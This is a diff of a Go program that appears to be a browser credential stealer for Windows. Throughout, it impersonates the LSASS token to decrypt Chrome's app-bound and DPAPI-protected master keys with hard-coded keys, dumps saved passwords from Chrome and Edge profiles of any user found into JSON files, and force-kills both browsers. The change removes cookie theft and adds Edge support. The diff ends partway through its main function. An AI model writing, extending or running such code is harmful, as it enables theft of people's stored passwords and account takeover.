@@ -8,12 +8,11 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
-	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 	"syscall"
-	"time"
 	"unsafe"
 
 	_ "github.com/mattn/go-sqlite3"
@@ -33,34 +32,23 @@ const (
 )
 
 var (
-	advapi32           = windows.NewLazySystemDLL("advapi32.dll")
-	ncrypt             = windows.NewLazySystemDLL("ncrypt.dll")
-	crypt32            = windows.NewLazySystemDLL("crypt32.dll")
-	
-	procOpenProcessToken        = advapi32.NewProc("OpenProcessToken")
-	procDuplicateTokenEx        = advapi32.NewProc("DuplicateTokenEx")
-	procSetThreadToken          = advapi32.NewProc("SetThreadToken")
-	procLookupPrivilegeValue    = advapi32.NewProc("LookupPrivilegeValueW")
-	procAdjustTokenPrivileges   = advapi32.NewProc("AdjustTokenPrivileges")
-	
+	advapi32 = windows.NewLazySystemDLL("advapi32.dll")
+	ncrypt   = windows.NewLazySystemDLL("ncrypt.dll")
+	crypt32  = windows.NewLazySystemDLL("crypt32.dll")
+
+	procOpenProcessToken      = advapi32.NewProc("OpenProcessToken")
+	procDuplicateTokenEx      = advapi32.NewProc("DuplicateTokenEx")
+	procSetThreadToken        = advapi32.NewProc("SetThreadToken")
+	procLookupPrivilegeValue  = advapi32.NewProc("LookupPrivilegeValueW")
+	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
+
 	procNCryptOpenStorageProvider = ncrypt.NewProc("NCryptOpenStorageProvider")
-	procNCryptOpenKey            = ncrypt.NewProc("NCryptOpenKey")
-	procNCryptDecrypt            = ncrypt.NewProc("NCryptDecrypt")
-	procNCryptFreeObject         = ncrypt.NewProc("NCryptFreeObject")
-	
+	procNCryptOpenKey             = ncrypt.NewProc("NCryptOpenKey")
+	procNCryptDecrypt             = ncrypt.NewProc("NCryptDecrypt")
+	procNCryptFreeObject          = ncrypt.NewProc("NCryptFreeObject")
+
 	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
 )
-
-type Cookie struct {
-	Host       string `json:"host"`
-	Name       string `json:"name"`
-	Path       string `json:"path"`
-	Expires    string `json:"expires"`
-	ExpiresRaw int64  `json:"expires_raw"`
-	Secure     bool   `json:"secure"`
-	HttpOnly   bool   `json:"httponly"`
-	Value      string `json:"value"`
-}
 
 type Password struct {
 	URL      string `json:"url"`
@@ -69,49 +57,12 @@ type Password struct {
 }
 
 type KeyBlob struct {
-	Header           []byte
-	Flag             byte
-	IV               []byte
-	Ciphertext       []byte
-	Tag              []byte
-	EncryptedAESKey  []byte
-}
-
-func chromiumMicrosecondsToTime(ts int64) time.Time {
-	if ts <= 0 {
-		return time.Time{}
-	}
-	
-	// Chrome uses microseconds since January 1, 1601 (Windows FILETIME epoch)
-	// We need to convert to Unix epoch (January 1, 1970)
-	
-	// Microseconds between 1601-01-01 and 1970-01-01
-	const epochDiff int64 = 11644473600000000 // microseconds, not seconds!
-	
-	// Convert to Unix microseconds
-	unixMicros := ts - epochDiff
-	
-	if unixMicros < 0 {
-		return time.Time{}
-	}
-	
-	// Convert to seconds and nanoseconds
-	secs := unixMicros / 1_000_000
-	nsecs := (unixMicros % 1_000_000) * 1000
-	
-	return time.Unix(secs, nsecs)
-}
-
-func formatChromiumTime(ts int64) string {
-	if ts <= 0 {
-		return "Never"
-	}
-	t := chromiumMicrosecondsToTime(ts)
-	if t.IsZero() {
-		return "Never"
-	}
-	// Format as "YYYY-MM-DD HH:MM:SS" in local time
-	return t.Local().Format("2006-01-02 15:04:05")
+	Header          []byte
+	Flag            byte
+	IV              []byte
+	Ciphertext      []byte
+	Tag             []byte
+	EncryptedAESKey []byte
 }
 
 func isAdmin() bool {
@@ -127,7 +78,7 @@ func isAdmin() bool {
 		return false
 	}
 	defer windows.FreeSid(sid)
-	
+
 	token := windows.Token(0)
 	member, err := token.IsMember(sid)
 	if err != nil {
@@ -143,7 +94,7 @@ func enableDebugPrivilege() error {
 		return fmt.Errorf("OpenProcessToken failed: %w", err)
 	}
 	defer token.Close()
-	
+
 	var luid windows.LUID
 	privilegeName, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
 	ret, _, err := procLookupPrivilegeValue.Call(
@@ -154,7 +105,7 @@ func enableDebugPrivilege() error {
 	if ret == 0 {
 		return fmt.Errorf("LookupPrivilegeValue failed: %w", err)
 	}
-	
+
 	tp := struct {
 		PrivilegeCount uint32
 		Luid           windows.LUID
@@ -164,7 +115,7 @@ func enableDebugPrivilege() error {
 		Luid:           luid,
 		Attributes:     SE_PRIVILEGE_ENABLED,
 	}
-	
+
 	ret, _, err = procAdjustTokenPrivileges.Call(
 		uintptr(token),
 		0,
@@ -176,7 +127,7 @@ func enableDebugPrivilege() error {
 	if ret == 0 {
 		return fmt.Errorf("AdjustTokenPrivileges failed: %w", err)
 	}
-	
+
 	return nil
 }
 
@@ -186,15 +137,15 @@ func getLsassToken() (windows.Token, error) {
 		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %w", err)
 	}
 	defer windows.CloseHandle(snapshot)
-	
+
 	var pe32 windows.ProcessEntry32
 	pe32.Size = uint32(unsafe.Sizeof(pe32))
-	
+
 	err = windows.Process32First(snapshot, &pe32)
 	if err != nil {
 		return 0, fmt.Errorf("Process32First failed: %w", err)
 	}
-	
+
 	var lsassPID uint32
 	for {
 		processName := windows.UTF16ToString(pe32.ExeFile[:])
@@ -207,22 +158,20 @@ func getLsassToken() (windows.Token, error) {
 			break
 		}
 	}
-	
+
 	if lsassPID == 0 {
 		return 0, fmt.Errorf("lsass.exe not found")
 	}
-	
-	// Try with maximum access first
+
 	processHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, lsassPID)
 	if err != nil {
-		// Fallback to minimal access
 		processHandle, err = windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, lsassPID)
 		if err != nil {
 			return 0, fmt.Errorf("OpenProcess failed (try running as SYSTEM): %w", err)
 		}
 	}
 	defer windows.CloseHandle(processHandle)
-	
+
 	var token windows.Token
 	ret, _, err := procOpenProcessToken.Call(
 		uintptr(processHandle),
@@ -232,7 +181,7 @@ func getLsassToken() (windows.Token, error) {
 	if ret == 0 {
 		return 0, fmt.Errorf("OpenProcessToken failed: %w (try running as SYSTEM)", err)
 	}
-	
+
 	return token, nil
 }
 
@@ -241,12 +190,12 @@ func impersonateLsass() (windows.Token, error) {
 	if err != nil {
 		return 0, err
 	}
-	
+
 	lsassToken, err := getLsassToken()
 	if err != nil {
 		return 0, err
 	}
-	
+
 	var dupToken windows.Token
 	ret, _, _ := procDuplicateTokenEx.Call(
 		uintptr(lsassToken),
@@ -259,12 +208,12 @@ func impersonateLsass() (windows.Token, error) {
 	if ret == 0 {
 		return 0, fmt.Errorf("DuplicateTokenEx failed")
 	}
-	
+
 	ret, _, _ = procSetThreadToken.Call(0, uintptr(dupToken))
 	if ret == 0 {
 		return 0, fmt.Errorf("SetThreadToken failed")
 	}
-	
+
 	return dupToken, nil
 }
 
@@ -278,7 +227,7 @@ func dpapiUnprotect(data []byte) ([]byte, error) {
 		Size: uint32(len(data)),
 		Data: &data[0],
 	}
-	
+
 	ret, _, err := procCryptUnprotectData.Call(
 		uintptr(unsafe.Pointer(&inBlob)),
 		0, 0, 0, 0, 0,
@@ -287,15 +236,16 @@ func dpapiUnprotect(data []byte) ([]byte, error) {
 	if ret == 0 {
 		return nil, fmt.Errorf("CryptUnprotectData failed: %w", err)
 	}
-	
+
 	result := make([]byte, outBlob.Size)
 	copy(result, unsafe.Slice(outBlob.Data, outBlob.Size))
 	windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.Data)))
-	
+
 	return result, nil
 }
 
-func ncryptDecrypt(data []byte) ([]byte, error) {
+// browser: "chrome" or "edge"
+func ncryptDecrypt(data []byte, browser string) ([]byte, error) {
 	var hProvider uintptr
 	provider := windows.StringToUTF16Ptr("Microsoft Software Key Storage Provider")
 	ret, _, _ := procNCryptOpenStorageProvider.Call(
@@ -307,9 +257,16 @@ func ncryptDecrypt(data []byte) ([]byte, error) {
 		return nil, fmt.Errorf("NCryptOpenStorageProvider failed")
 	}
 	defer procNCryptFreeObject.Call(hProvider)
-	
+
+	// Key name depends on browser
+	var keyName *uint16
+	if browser == "edge" {
+		keyName = windows.StringToUTF16Ptr("Microsoft Edgekey1")
+	} else {
+		keyName = windows.StringToUTF16Ptr("Google Chromekey1")
+	}
+
 	var hKey uintptr
-	keyName := windows.StringToUTF16Ptr("Google Chromekey1")
 	ret, _, _ = procNCryptOpenKey.Call(
 		hProvider,
 		uintptr(unsafe.Pointer(&hKey)),
@@ -317,10 +274,10 @@ func ncryptDecrypt(data []byte) ([]byte, error) {
 		0, 0,
 	)
 	if ret != 0 {
-		return nil, fmt.Errorf("NCryptOpenKey failed")
+		return nil, fmt.Errorf("NCryptOpenKey failed for key %s", windows.UTF16PtrToString(keyName))
 	}
 	defer procNCryptFreeObject.Call(hKey)
-	
+
 	var resultSize uint32
 	ret, _, _ = procNCryptDecrypt.Call(
 		hKey,
@@ -333,7 +290,7 @@ func ncryptDecrypt(data []byte) ([]byte, error) {
 	if ret != 0 {
 		return nil, fmt.Errorf("NCryptDecrypt size query failed")
 	}
-	
+
 	output := make([]byte, resultSize)
 	ret, _, _ = procNCryptDecrypt.Call(
 		hKey,
@@ -348,7 +305,7 @@ func ncryptDecrypt(data []byte) ([]byte, error) {
 	if ret != 0 {
 		return nil, fmt.Errorf("NCryptDecrypt failed")
 	}
-	
+
 	return output[:resultSize], nil
 }
 
@@ -356,23 +313,20 @@ func parseKeyBlob(data []byte) (*KeyBlob, error) {
 	if len(data) < 8 {
 		return nil, fmt.Errorf("blob too short")
 	}
-	
+
 	headerLen := binary.LittleEndian.Uint32(data[0:4])
 	header := data[4 : 4+headerLen]
-	
+
 	contentLen := binary.LittleEndian.Uint32(data[4+headerLen : 8+headerLen])
+	_ = contentLen
 	offset := 8 + headerLen
-	
-	if int(headerLen+contentLen+8) != len(data) {
-		return nil, fmt.Errorf("blob size mismatch")
-	}
-	
+
 	blob := &KeyBlob{
 		Header: header,
 		Flag:   data[offset],
 	}
 	offset++
-	
+
 	switch blob.Flag {
 	case 1, 2:
 		blob.IV = data[offset : offset+12]
@@ -391,7 +345,7 @@ func parseKeyBlob(data []byte) (*KeyBlob, error) {
 	default:
 		return nil, fmt.Errorf("unsupported flag: %d", blob.Flag)
 	}
-	
+
 	return blob, nil
 }
 
@@ -403,10 +357,11 @@ func xorBytes(a, b []byte) []byte {
 	return result
 }
 
-func deriveV20MasterKey(blob *KeyBlob) ([]byte, error) {
+// browser: "chrome" or "edge"
+func deriveV20MasterKey(blob *KeyBlob, browser string) ([]byte, error) {
 	var aesKey []byte
 	var gcm cipher.AEAD
-	
+
 	switch blob.Flag {
 	case 1:
 		aesKey, _ = hexDecode("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
@@ -418,25 +373,25 @@ func deriveV20MasterKey(blob *KeyBlob) ([]byte, error) {
 		if err != nil {
 			return nil, err
 		}
-		
+
 	case 2:
 		return nil, fmt.Errorf("ChaCha20-Poly1305 not implemented")
-		
+
 	case 3:
 		xorKey, _ := hexDecode("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
-		
+
 		token, err := impersonateLsass()
 		if err != nil {
 			return nil, err
 		}
 		defer revertToSelf()
 		defer token.Close()
-		
-		decryptedAESKey, err := ncryptDecrypt(blob.EncryptedAESKey)
+
+		decryptedAESKey, err := ncryptDecrypt(blob.EncryptedAESKey, browser)
 		if err != nil {
 			return nil, err
 		}
-		
+
 		aesKey = xorBytes(decryptedAESKey, xorKey)
 		block, err := aes.NewCipher(aesKey)
 		if err != nil {
@@ -447,123 +402,126 @@ func deriveV20MasterKey(blob *KeyBlob) ([]byte, error) {
 			return nil, err
 		}
 	}
-	
+
 	ciphertext := append(blob.Ciphertext, blob.Tag...)
 	plaintext, err := gcm.Open(nil, blob.IV, ciphertext, nil)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	return plaintext, nil
 }
 
-func getMasterKey() ([]byte, error) {
-	userProfile := os.Getenv("USERPROFILE")
-	localStatePath := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-	
+// getMasterKey now takes the Local State path AND browser name
+func getMasterKey(localStatePath, browser string) ([]byte, error) {
 	data, err := os.ReadFile(localStatePath)
 	if err != nil {
 		return nil, fmt.Errorf("failed to read Local State: %w", err)
 	}
-	
+
 	var localState map[string]interface{}
 	err = json.Unmarshal(data, &localState)
 	if err != nil {
 		return nil, fmt.Errorf("failed to parse Local State JSON: %w", err)
 	}
-	
+
 	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
 	if !ok {
 		return nil, fmt.Errorf("os_crypt not found in Local State")
 	}
-	
-	// Try v20 app-bound key FIRST (newer Chrome versions have both keys)
+
+	// Try v20 app-bound key FIRST – but only for Chrome
 	encryptedKeyB64, hasAppBound := osCrypt["app_bound_encrypted_key"].(string)
-	if hasAppBound {
-		fmt.Println("Detected v20 app-bound encryption key")
-		
+	if hasAppBound && browser == "chrome" {
+		fmt.Println("Detected v20 app-bound encryption key (Chrome)")
+
 		encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
 		if err != nil {
 			return nil, fmt.Errorf("failed to decode v20 key: %w", err)
 		}
-		
+
 		if len(encryptedKey) < 4 || string(encryptedKey[:4]) != "APPB" {
 			return nil, fmt.Errorf("invalid app-bound key format")
 		}
-		
+
 		encryptedKey = encryptedKey[4:] // Remove "APPB" prefix
-		
+
 		token, err := impersonateLsass()
 		if err != nil {
 			return nil, fmt.Errorf("failed to impersonate LSASS (required for v20): %w\nNote: v20 encryption requires SYSTEM privileges", err)
 		}
 		defer revertToSelf()
 		defer token.Close()
-		
+
 		systemDecrypted, err := dpapiUnprotect(encryptedKey)
 		if err != nil {
 			return nil, fmt.Errorf("failed system DPAPI decrypt: %w", err)
 		}
-		
+
 		revertToSelf()
-		
+
 		userDecrypted, err := dpapiUnprotect(systemDecrypted)
 		if err != nil {
 			return nil, fmt.Errorf("failed user DPAPI decrypt: %w", err)
 		}
-		
+
 		blob, err := parseKeyBlob(userDecrypted)
 		if err != nil {
 			return nil, fmt.Errorf("failed to parse key blob: %w", err)
 		}
-		
-		masterKey, err := deriveV20MasterKey(blob)
+
+		masterKey, err := deriveV20MasterKey(blob, browser)
 		if err != nil {
 			return nil, fmt.Errorf("failed to derive v20 key: %w", err)
 		}
-		
-		fmt.Println("✓ Using v20 app-bound master key")
+
+		fmt.Println("✓ Using v20 app-bound master key (Chrome)")
 		return masterKey, nil
 	}
-	
+
+	if hasAppBound && browser == "edge" {
+		// Edge app-bound format is different; our parser doesn’t support it yet.
+		fmt.Println("Detected v20 app-bound encryption key (Edge) – currently unsupported, trying legacy encrypted_key instead...")
+	}
+
 	// Fall back to legacy encrypted_key (v10/v11)
 	encryptedKeyB64, ok = osCrypt["encrypted_key"].(string)
 	if !ok {
-		return nil, fmt.Errorf("no encrypted key found (neither encrypted_key nor app_bound_encrypted_key)")
+		return nil, fmt.Errorf("no legacy encrypted_key found (neither encrypted_key nor supported app_bound_encrypted_key)")
 	}
-	
-	fmt.Println("Detected v10/v11 encryption (legacy) - WARNING: This may not work for v20 encrypted data!")
-	
+
+	fmt.Printf("Detected v10/v11 legacy encryption for %s\n", strings.Title(browser))
+
 	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
 	if err != nil {
 		return nil, fmt.Errorf("failed to decode key: %w", err)
 	}
-	
+
 	if len(encryptedKey) < 5 || string(encryptedKey[:5]) != "DPAPI" {
 		return nil, fmt.Errorf("invalid key format")
 	}
-	
+
 	encryptedKey = encryptedKey[5:] // Remove "DPAPI" prefix
-	
+
 	// Try without impersonation first (works for current user)
 	masterKey, err := dpapiUnprotect(encryptedKey)
 	if err == nil {
 		return masterKey, nil
 	}
-	
-	fmt.Println("Trying with LSASS impersonation...")
+
+	fmt.Println("Trying with LSASS impersonation for legacy key...")
 	token, err := impersonateLsass()
 	if err != nil {
 		return nil, fmt.Errorf("failed to impersonate LSASS: %w", err)
 	}
 	defer revertToSelf()
 	defer token.Close()
-	
+
 	masterKey, err = dpapiUnprotect(encryptedKey)
 	if err != nil {
 		return nil, fmt.Errorf("failed to decrypt legacy key: %w", err)
 	}
-	
+
 	return masterKey, nil
 }
 
@@ -584,95 +542,71 @@ func getEncryptionVersion(data []byte) string {
 	}
 }
 
-func decryptValue(encryptedValue []byte, masterKey []byte, isPassword bool) (string, error) {
+func decryptValue(encryptedValue []byte, masterKey []byte) (string, error) {
 	if len(encryptedValue) == 0 {
 		return "", nil
 	}
-	
+
 	version := getEncryptionVersion(encryptedValue)
-	
+
 	switch version {
-	case "v20":
+	case "v10", "v11", "v20":
+		// All v10/v11/v20 use AES-GCM with the masterKey, not DPAPI.
 		if masterKey == nil {
-			return "", fmt.Errorf("no master key for v20")
+			return "", fmt.Errorf("no master key for %s", version)
 		}
-		
-		if len(encryptedValue) < 31 {
-			return "", fmt.Errorf("encrypted value too short")
+
+		// Layout: "v10"/"v11"/"v20" (3 bytes) + 12-byte nonce + ciphertext||tag
+		if len(encryptedValue) < 3+12+16 {
+			return "", fmt.Errorf("encrypted value too short for %s", version)
 		}
-		
-		iv := encryptedValue[3:15]
-		ciphertext := encryptedValue[15 : len(encryptedValue)-16]
-		tag := encryptedValue[len(encryptedValue)-16:]
-		
+
+		iv := encryptedValue[3 : 3+12]
+		data := encryptedValue[3+12:] // ciphertext || tag
+
 		block, err := aes.NewCipher(masterKey)
 		if err != nil {
 			return "", fmt.Errorf("cipher init failed: %w", err)
 		}
-		
+
 		gcm, err := cipher.NewGCM(block)
 		if err != nil {
 			return "", fmt.Errorf("GCM init failed: %w", err)
 		}
-		
-		combined := append(ciphertext, tag...)
-		plaintext, err := gcm.Open(nil, iv, combined, nil)
+
+		plaintext, err := gcm.Open(nil, iv, data, nil)
 		if err != nil {
-			return "", fmt.Errorf("decryption failed: %w", err)
+			return "", fmt.Errorf("decryption failed (%s): %w", version, err)
 		}
-		
-		if !isPassword && len(plaintext) > 32 {
-			plaintext = plaintext[32:]
-		}
-		
+
+		// For passwords we keep plaintext as-is (no stripping of prefixes)
 		return string(plaintext), nil
-		
-	case "v10", "v11":
-		// Try direct DPAPI first
-		decrypted, err := dpapiUnprotect(encryptedValue)
-		if err == nil {
-			return string(decrypted), nil
-		}
-		
-		// Try with impersonation
-		token, err := impersonateLsass()
-		if err != nil {
-			return "", fmt.Errorf("DPAPI failed, cannot impersonate: %w", err)
-		}
-		defer revertToSelf()
-		defer token.Close()
-		
-		decrypted, err = dpapiUnprotect(encryptedValue)
-		if err != nil {
-			return "", fmt.Errorf("DPAPI decrypt failed: %w", err)
-		}
-		
-		return string(decrypted), nil
-		
+
 	case "DPAPI":
-		// Try direct DPAPI first
+		// Old records encrypted directly with DPAPI – no masterKey involved.
 		decrypted, err := dpapiUnprotect(encryptedValue)
 		if err == nil {
 			return string(decrypted), nil
 		}
-		
-		// Try with impersonation
+
+		// Try with LSASS impersonation as a fallback
 		token, err := impersonateLsass()
 		if err != nil {
 			return "", fmt.Errorf("DPAPI failed, cannot impersonate: %w", err)
 		}
 		defer revertToSelf()
 		defer token.Close()
-		
+
 		decrypted, err = dpapiUnprotect(encryptedValue)
 		if err != nil {
 			return "", fmt.Errorf("DPAPI decrypt failed: %w", err)
 		}
-		
+
 		return string(decrypted), nil
+
+	default:
+		return "", fmt.Errorf("unknown encryption version: %s", version)
 	}
-	
-	return "", fmt.Errorf("unknown version: %s", version)
 }
 
 func hexDecode(s string) ([]byte, error) {
@@ -683,122 +617,36 @@ func hexDecode(s string) ([]byte, error) {
 	return result, nil
 }
 
-func extractCookies(profileDir, profileName string, masterKey []byte) error {
-	cookieDBPath := filepath.Join(profileDir, "Network", "Cookies")
-	
-	tempDB := filepath.Join(os.TempDir(), fmt.Sprintf("Cookies_%s.db", profileName))
-	input, err := os.Open(cookieDBPath)
-	if err != nil {
-		return err
-	}
-	defer input.Close()
-	
-	output, err := os.Create(tempDB)
-	if err != nil {
-		return err
-	}
-	defer output.Close()
-	
-	_, err = io.Copy(output, input)
-	if err != nil {
-		return err
-	}
-	output.Close()
-	
-	db, err := sql.Open("sqlite3", tempDB)
-	if err != nil {
-		return err
-	}
-	defer db.Close()
-	defer os.Remove(tempDB)
-	
-	rows, err := db.Query("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")
-	if err != nil {
-		return err
-	}
-	defer rows.Close()
-	
-	var cookies []Cookie
-	successCount := 0
-	failCount := 0
-	
-	for rows.Next() {
-		var host, name, path string
-		var expires int64
-		var secure, httponly int
-		var encryptedValue []byte
-		
-		err := rows.Scan(&host, &name, &path, &expires, &secure, &httponly, &encryptedValue)
-		if err != nil {
-			continue
-		}
-		
-		value, err := decryptValue(encryptedValue, masterKey, false)
-		if err != nil {
-			value = "DECRYPT_FAILED"
-			failCount++
-			if failCount == 1 {
-				fmt.Printf("  First cookie decrypt error: %v\n", err)
-				fmt.Printf("  Encryption version: %s, Length: %d\n", getEncryptionVersion(encryptedValue), len(encryptedValue))
-			}
-		} else {
-			successCount++
-		}
-		
-		cookies = append(cookies, Cookie{
-			Host:       host,
-			Name:       name,
-			Path:       path,
-			Expires:    formatChromiumTime(expires),
-			ExpiresRaw: expires,
-			Secure:     secure == 1,
-			HttpOnly:   httponly == 1,
-			Value:      value,
-		})
-	}
-	
-	fmt.Printf("  Cookies: %d succeeded, %d failed\n", successCount, failCount)
-	
-	outputDir := filepath.Join("results", profileName)
-	os.MkdirAll(outputDir, 0755)
-	
-	cookieJSON, err := json.MarshalIndent(cookies, "", "  ")
-	if err != nil {
-		return err
-	}
-	
-	return os.WriteFile(filepath.Join(outputDir, "cookies.json"), cookieJSON, 0644)
-}
-
-func extractPasswords(profileDir, profileName string, masterKey []byte) error {
+// browser is "chrome" or "edge"
+func extractPasswords(profileDir, profileName, browser string, masterKey []byte) error {
 	loginDBPath := filepath.Join(profileDir, "Login Data")
-	
+
 	db, err := sql.Open("sqlite3", "file:"+loginDBPath+"?mode=ro&immutable=1")
 	if err != nil {
 		return err
 	}
 	defer db.Close()
-	
+
 	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
 	if err != nil {
 		return err
 	}
 	defer rows.Close()
-	
+
 	var passwords []Password
 	successCount := 0
 	failCount := 0
-	
+
 	for rows.Next() {
 		var url, username string
 		var encryptedPassword []byte
-		
+
 		err := rows.Scan(&url, &username, &encryptedPassword)
 		if err != nil {
 			continue
 		}
-		
-		password, err := decryptValue(encryptedPassword, masterKey, true)
+
+		password, err := decryptValue(encryptedPassword, masterKey)
 		if err != nil {
 			password = "DECRYPT_FAILED"
 			failCount++
@@ -809,25 +657,118 @@ func extractPasswords(profileDir, profileName string, masterKey []byte) error {
 		} else {
 			successCount++
 		}
-		
+
 		passwords = append(passwords, Password{
 			URL:      url,
 			Username: username,
 			Password: password,
 		})
 	}
-	
+
 	fmt.Printf("  Passwords: %d succeeded, %d failed\n", successCount, failCount)
-	
-	outputDir := filepath.Join("results", profileName)
+
+	outputDir := filepath.Join("results","chromium", browser, profileName)
 	os.MkdirAll(outputDir, 0755)
-	
+
 	passwordJSON, err := json.MarshalIndent(passwords, "", "  ")
 	if err != nil {
 		return err
 	}
-	
+
 	return os.WriteFile(filepath.Join(outputDir, "passwords.json"), passwordJSON, 0644)
+}
+
+// runBrowserExtraction handles one Chromium browser (chrome/edge)
+func runBrowserExtraction(browser, userDataDir string) {
+	title := strings.Title(browser)
+
+	if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
+		fmt.Printf("\n%s user data directory not found, skipping (%s)\n", title, userDataDir)
+		return
+	}
+
+	fmt.Printf("\n=== %s extraction ===\n", title)
+
+	localStatePath := filepath.Join(userDataDir, "Local State")
+	fmt.Println("Getting master key...")
+	masterKey, err := getMasterKey(localStatePath, browser)
+	if err != nil {
+		fmt.Printf("\n❌ Failed to get %s master key: %v\n", title, err)
+		fmt.Println("\n=== Troubleshooting ===")
+		fmt.Println("1. Chromium v127+ uses v20 encryption requiring SYSTEM privileges")
+		fmt.Println("2. Download PsExec: https://live.sysinternals.com/psexec.exe")
+		fmt.Println("3. Run the tool as SYSTEM for full decryption support")
+		fmt.Println("4. Alternatively, use NSudo or Task Scheduler to run as SYSTEM")
+		return
+	}
+
+	fmt.Println("✓ Master key obtained successfully!")
+
+	entries, err := os.ReadDir(userDataDir)
+	if err != nil {
+		fmt.Printf("Failed to read %s directory: %v\n", title, err)
+		return
+	}
+
+	for _, entry := range entries {
+		if !entry.IsDir() {
+			continue
+		}
+
+		name := entry.Name()
+		matched, _ := filepath.Match("Profile*", name)
+		if name != "Default" && !matched {
+			continue
+		}
+
+		profileDir := filepath.Join(userDataDir, name)
+		profileName := name
+
+		fmt.Printf("\nProcessing %s profile: %s\n", browser, profileName)
+
+		if err := extractPasswords(profileDir, profileName, browser, masterKey); err != nil {
+			fmt.Printf("Password extraction failed: %v\n", err)
+		} else {
+			fmt.Printf("Passwords extracted\n")
+		}
+	}
+}
+
+// findUserProfile tries to locate a user profile that has Chrome or Edge data
+func findUserProfile() string {
+	userProfile := os.Getenv("USERPROFILE")
+	if userProfile != "" {
+		return userProfile
+	}
+
+	usersDir := "C:\\Users"
+	entries, err := os.ReadDir(usersDir)
+	if err != nil {
+		fmt.Printf("Failed to read Users directory: %v\n", err)
+		return ""
+	}
+
+	for _, entry := range entries {
+		if !entry.IsDir() || entry.Name() == "Public" || entry.Name() == "Default" {
+			continue
+		}
+
+		base := filepath.Join(usersDir, entry.Name(), "AppData", "Local")
+
+		chromePath := filepath.Join(base, "Google", "Chrome", "User Data")
+		edgePath := filepath.Join(base, "Microsoft", "Edge", "User Data")
+
+		if _, err := os.Stat(chromePath); err == nil {
+			fmt.Printf("Found user profile with Chrome data: %s\n", entry.Name())
+			return filepath.Join(usersDir, entry.Name())
+		}
+		if _, err := os.Stat(edgePath); err == nil {
+			fmt.Printf("Found user profile with Edge data: %s\n", entry.Name())
+			return filepath.Join(usersDir, entry.Name())
+		}
+	}
+
+	return ""
 }
 
 func Run() {
@@ -838,115 +779,48 @@ func Run() {
 		fmt.Scanln()
 		return
 	}
-	
+
 	fmt.Println("Running with administrator privileges...")
-	
+
 	// Check if running as SYSTEM
-	token := windows.Token(0)
-	windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
-	user, _ := token.GetTokenUser()
-	sid := user.User.Sid.String()
-	isSystem := sid == "S-1-5-18"
-	
-	if isSystem {
-		fmt.Println("✓ Running as SYSTEM")
+	var token windows.Token
+	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err == nil {
+		defer token.Close()
+		user, _ := token.GetTokenUser()
+		sid := user.User.Sid.String()
+		if sid == "S-1-5-18" {
+			fmt.Println("✓ Running as SYSTEM")
+		} else {
+			fmt.Println("⚠ Running as Administrator (not SYSTEM)")
+		}
 	} else {
-		fmt.Println("⚠ Running as Administrator (not SYSTEM)")
+		fmt.Println("⚠ Could not query token to detect SYSTEM/admin properly")
 	}
-	
-	// Kill Chrome
-	fmt.Println("\nAttempting to close Chrome...")
+
+	// Kill Chrome and Edge
+	fmt.Println("\nAttempting to close Chrome and Edge...")
 	exec.Command("taskkill", "/F", "/IM", "chrome.exe").Run()
-	
-	userProfile := os.Getenv("USERPROFILE")
+	exec.Command("taskkill", "/F", "/IM", "msedge.exe").Run()
+
+	userProfile := findUserProfile()
 	if userProfile == "" {
-		// When running as SYSTEM, USERPROFILE might not be set
-		// Try to find user directories
-		usersDir := "C:\\Users"
-		entries, err := os.ReadDir(usersDir)
-		if err != nil {
-			fmt.Printf("Failed to read Users directory: %v\n", err)
-			fmt.Println("\nPress Enter to exit...")
-			fmt.Scanln()
-			return
-		}
-		
-		// Find the first user directory that has Chrome data
-		for _, entry := range entries {
-			if !entry.IsDir() || entry.Name() == "Public" || entry.Name() == "Default" {
-				continue
-			}
-			testPath := filepath.Join(usersDir, entry.Name(), "AppData", "Local", "Google", "Chrome", "User Data")
-			if _, err := os.Stat(testPath); err == nil {
-				userProfile = filepath.Join(usersDir, entry.Name())
-				fmt.Printf("Found Chrome user profile: %s\n", entry.Name())
-				break
-			}
-		}
-		
-		if userProfile == "" {
-			fmt.Println("Could not find Chrome user profile")
-			fmt.Println("\nPress Enter to exit...")
-			fmt.Scanln()
-			return
-		}
-	}
-	
-	chromeUserData := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data")
-	
-	fmt.Println("\nGetting master key...")
-	masterKey, err := getMasterKey()
-	if err != nil {
-		fmt.Printf("\n❌ Failed to get master key: %v\n", err)
-		fmt.Println("\n=== Troubleshooting ===")
-		fmt.Println("1. Chrome v127+ uses v20 encryption requiring SYSTEM privileges")
-		fmt.Println("2. Download PsExec: https://live.sysinternals.com/psexec.exe")
-		fmt.Println("3. Run as SYSTEM:")
-		fmt.Println("\nAlternatively, use NSudo or Task Scheduler to run as SYSTEM")
+		fmt.Println("Could not find a user profile with Chrome or Edge data")
 		fmt.Println("\nPress Enter to exit...")
 		fmt.Scanln()
 		return
 	}
-	
-	fmt.Println("✓ Master key obtained successfully!")
-	
-	entries, err := os.ReadDir(chromeUserData)
-	if err != nil {
-		fmt.Printf("Failed to read Chrome directory: %v\n", err)
-		fmt.Println("\nPress Enter to exit...")
-		fmt.Scanln()
-		return
-	}
-	
-	for _, entry := range entries {
-		if !entry.IsDir() {
-			continue
-		}
-		
-		name := entry.Name()
